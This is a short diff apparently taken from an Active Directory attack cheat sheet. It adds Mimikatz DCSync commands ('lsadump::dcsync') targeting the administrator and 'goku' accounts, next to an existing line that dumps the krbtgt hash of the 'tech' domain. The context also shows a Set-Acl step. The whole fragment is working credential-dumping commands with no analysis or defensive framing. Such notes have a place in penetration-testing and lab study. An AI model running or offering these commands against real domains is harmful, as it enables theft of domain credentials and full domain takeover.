@@ -1690,6 +1690,8 @@ Set-acl -aclobject $MyACL $MyDistinguishedNameAD
 ```
 .\Mimikatz
 lsadump::dcsync /user:tech\krbtgt
+lsadump::dcsync /user:tech\administrator
+lsadump::dcsync /user:tech\goku
 ```
 
 
